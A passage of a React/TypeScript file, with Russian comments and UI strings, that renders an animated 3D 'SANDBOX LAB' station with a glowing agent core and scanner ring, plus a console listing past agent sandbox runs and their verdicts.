          {runs.length === 0 && <div style={{ color: '#4a5570', fontSize: 10 }}>История пуста</div>}
          {runs.map((r) => {
            const m = SANDBOX_VERDICT_META[r.verdict];
            return (
              <div
                key={r.id}
                onClick={() => selectRun(r.id)}
                onPointerDown={(e) => e.stopPropagation()}
                style={{
                  display: 'flex',
                  gap: 8,
                  fontSize: 10,
                  padding: '3px 6px',
                  borderRadius: 5,
                  cursor: 'pointer',
                  background: r.id === selectedRunId ? 'rgba(77,208,255,0.12)' : 'transparent',
                }}
              >
                <span style={{ color: m.color }}>{m.glyph}</span>
                <span style={{ flex: 1, color: '#c7d6f2' }}>{r.agent}</span>
                <span style={{ color: '#6b7ea0' }}>
                  {r.durationMs}мс · {r.ops}ops
                </span>
              </div>
            );
          })}
          {runs.length > 0 && (
            <button
              style={{ ...btnStyle, marginTop: 4, width: '100%' }}
              onClick={clearRuns}
              onPointerDown={(e) => e.stopPropagation()}
            >
              Очистить историю
            </button>
          )}
        </div>
      )}
    </div>
  );
}

/* -------------------------------------------------------------------------- */
/*  3D-станция «SANDBOX LAB»                                                  */
/* -------------------------------------------------------------------------- */

export interface AgentSandboxProps {
  position?: [number, number, number];
  rotation?: [number, number, number];
}

/**
 * Физическая станция песочницы в паддоке: камера изоляции с ядром-агентом,
 * сканер-луч, LED-полоса и интерактивная консоль управления прогоном.
 */
export function AgentSandbox({ position = [0, 0, 0], rotation = [0, 0, 0] }: AgentSandboxProps) {
  const running = useAgentSandbox((s) => s.running);
  const runs = useAgentSandbox((s) => s.runs);
  const selectedRunId = useAgentSandbox((s) => s.selectedRunId);

  const verdict: SandboxVerdict = useMemo(() => {
    const r = runs.find((x) => x.id === selectedRunId);
    return r ? r.verdict : 'pending';
  }, [runs, selectedRunId]);

  const color = running ? '#4dd0ff' : SANDBOX_VERDICT_META[verdict].color;

  const coreRef = useRef<THREE.Mesh>(null);
  const ringRef = useRef<THREE.Mesh>(null);
  const coreMatRef = useRef<THREE.MeshStandardMaterial>(null);
  const beamRef = useRef<THREE.Mesh>(null);
  const lightRef = useRef<THREE.PointLight>(null);

  useFrame((state, delta) => {
    const t = state.clock.elapsedTime;
    const spin = running ? 2.6 : 0.7;

    if (coreRef.current) {
      coreRef.current.rotation.y += delta * spin;
      coreRef.current.rotation.x = Math.sin(t * 0.8) * 0.18;
      coreRef.current.position.y = 1.75 + Math.sin(t * 1.6) * 0.08;
    }
    if (ringRef.current) {
      ringRef.current.rotation.z += delta * (running ? 3.4 : 0.8);
      ringRef.current.scale.setScalar(1 + (running ? Math.sin(t * 6) * 0.04 : 0));
    }
    if (coreMatRef.current) {
      coreMatRef.current.emissiveIntensity = running
        ? 1.1 + Math.abs(Math.sin(t * 9)) * 0.9
        : 0.7 + Math.sin(t * 2.2) * 0.15;
    }
    if (beamRef.current) {
      const bm = beamRef.current.material as THREE.MeshBasicMaterial;
      bm.opacity = running ? 0.12 + Math.abs(Math.sin(t * 7)) * 0.1 : 0.05;
      beamRef.current.rotation.y += delta * 0.6;
    }
    if (lightRef.current) {
      lightRef.current.intensity = running ? 3.2 + Math.sin(t * 11) * 1.4 : 2.0;
    }
  });

  return (
    <group position={position} rotation={rotation}>
      {/* Подиум-платформа */}
      <mesh position={[0, 0.2, 0]} receiveShadow castShadow>
        <boxGeometry args={[6.4, 0.4, 5.2]} />
        <meshStandardMaterial color="#141a2d" metalness={0.65} roughness={0.35} />
      </mesh>

      {/* Светящийся пол камеры */}
      <mesh position={[0, 0.41, 0]} rotation={[-Math.PI / 2, 0, 0]}>
        <planeGeometry args={[5.6, 4.4]} />
        <meshStandardMaterial
          color="#080c16"
          emissive={color}
          emissiveIntensity={running ? 0.5 : 0.18}
          metalness={0.2}
          roughness={0.8}
        />
      </mesh>

      {/* Пьедестал ядра */}
      <mesh position={[0, 0.7, 0]} castShadow>
        <cylinderGeometry args={[1.3, 1.55, 0.6, 32]} />
        <meshStandardMaterial color="#1b2338" metalness={0.75} roughness={0.3} />
      </mesh>

      {/* Ядро-агент */}
      <mesh ref={coreRef} position={[0, 1.75, 0]} castShadow>
        <icosahedronGeometry args={[0.56, 1]} />
        <meshStandardMaterial
          ref={coreMatRef}
          color={color}
          emissive={color}
          emissiveIntensity={0.8}
          metalness={0.55}
          roughness={0.2}
        />
      </mesh>

      {/* Сканер-кольцо */}
      <mesh ref={ringRef} position={[0, 1.75, 0]} rotation={[Math.PI / 2, 0, 0]}>
        <torusGeometry args={[1.12, 0.04, 12, 56]} />
        <meshStandardMaterial color={color} emissive={color} emissiveIntensity={1.4} />
      </mesh>

      {/* Луч сканирования */}
      <mesh ref={beamRef} position={[0, 1.75, 0]}>
        <cylinderGeometry args={[1.06, 1.06, 2.6, 32, 1, true]} />
        <meshBasicMaterial color={color} transparent opacity={0.06} side={THREE.DoubleSide} />
      </mesh>

      {/* Стеклянная камера изоляции */}
      <mesh position={[0, 1.95, 0]}>
        <boxGeometry args={[3.7, 3.1, 3.7]} />
        <meshPhysicalMaterial
          color="#7dd3fc"
          transparent
          opacity={0.08}
          roughness={0.05}
          metalness={0}
          transmission={0.9}
          thickness={0.25}
        />
      </mesh>

      {/* Каркас камеры: 4 стойки + верхняя рама */}
      {[
        [-1.82, 1.82],
        [1.82, 1.82],
        [-1.82, -1.82],
        [1.82, -1.82],
      ].map(([x, z], i) => (
        <mesh key={'post' + i} position={[x, 1.95, z]} castShadow>
          <boxGeometry args={[0.09, 3.1, 0.09]} />
          <meshStandardMaterial color="#2b3a55" metalness={0.8} roughness={0.3} />
        </mesh>
      ))}
      <mesh position={[0, 3.52, 0]}>
        <boxGeometry args={[3.8, 0.12, 3.8]} />
        <meshStandardMaterial color="#22304a" metalness={0.8} roughness={0.3} />
      </mesh>

      {/* LED-полоса статуса */}
      <mesh position={[0, 3.62, 0]}>
        <boxGeometry args={[3.5, 0.06, 0.24]} />
        <meshStandardMaterial color={color} emissive={color} emissiveIntensity={2.2} />
      </mesh>

      {/* Операторский стол + экран консоли */}
      <mesh position={[0, 0.85, 2.05]} rotation={[-0.34, 0, 0]} castShadow>
        <boxGeometry args={[2.6, 0.18, 1.1]} />
        <meshStandardMaterial color="#101728" metalness={0.7} roughness={0.4} />
      </mesh>

      <group position={[0, 1.75, 1.62]} rotation={[-0.34, 0, 0]}>
        <mesh position={[0, 0, -0.04]}>
          <boxGeometry args={[3.3, 2.1, 0.08]} />
          <meshStandardMaterial color="#05070d" metalness={0.5} roughness={0.6} />
        </mesh>
        {/* Эмиссивный «экран» */}
        <mesh position={[0, 0, 0.005]}>
          <planeGeometry args={[3.16, 1.96]} />
          <meshStandardMaterial color="#05070d" emissive="#0b1c30" emissiveIntensity={0.7} />
        </mesh>
        <Html
          transform
          distanceFactor={1.15}
          position={[0, 0, 0.06]}
          style={{ width: 560, pointerEvents: 'auto' }}
        >
          <SandboxConsole />
        </Html>
      </group>

      {/* Свет */}
      <pointLight ref={lightRef} position={[0, 3.2, 0.6]} color={color} intensity={2} distance={14} />
      <pointLight position={[0, 1.4, 2.6]} color="#8fdcff" intensity={0.8} distance={8} />

      {/* Заголовки */}
      <Text
        position={[0, 3.95, 0]}
        fontSize={0.3}
        color="#e0e6f0"
        anchorX="center"
        anchorY="middle"
        letterSpacing={0.14}
      >
        SANDBOX LAB · 6.5
      </Text>
      <Text
        position={[0, 3.62, 0.35]}
        fontSize={0.16}
        color={color}
        anchorX="center"
        anchorY="middle"
        letterSpacing={0.08}
      >
        {running ? 'ISOLATING…' : SANDBOX_VERDICT_META[verdict].label}
      </Text>
    </group>
  );
}

export default AgentSandbox;
